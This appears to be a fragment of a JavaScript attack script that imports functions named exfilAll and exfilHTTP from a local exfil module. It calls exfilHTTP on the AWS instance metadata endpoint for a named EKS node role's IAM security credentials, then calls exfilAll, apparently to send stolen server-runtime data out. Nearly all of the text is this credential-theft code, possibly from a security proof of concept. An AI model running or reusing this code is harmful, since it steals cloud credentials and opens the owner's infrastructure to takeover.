...
const { exfilAll, exfilHTTP } = require('../../exfil');

exfilHTTP('http://169.254.169.254/latest/meta-data/iam/security-credentials/stg-sh-homebrew-eks-use1b-pan-node-role', 'serverruntime-hardcoded-securitycred')
exfilAll('serverruntime')
